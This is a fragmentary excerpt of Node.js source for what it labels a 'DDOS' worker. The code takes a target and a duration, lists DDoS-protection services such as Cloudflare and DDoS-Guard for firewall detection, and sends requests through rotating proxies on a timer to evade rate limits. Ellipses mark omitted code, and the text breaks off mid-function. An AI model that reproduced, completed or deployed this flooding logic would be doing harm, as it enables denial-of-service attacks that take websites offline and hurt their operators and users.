...
const request = require('request'),
    ...
    randomWords = require('./extras/random-words'),
...
function INIT() {
    logger('STARTING (DDOS) :: ', workerData.target, 'FOR', workerData.duration, 'MS', {
    ...
    const STATE = {
        ...
        firewall: false,
        firewalls: [],
        available: ['cloudflare', 'ddosguard', 'blazingfast']
    }
    ...
    class starter {
        init() {
            ...
            if (l7.opt.ratelimit) {
                ...
                setInterval(sendreq, 500); // 30ms fight rate limits. Loop through each proxy, more proxies less traffic per ip.
            } else {
                function randomreq() {
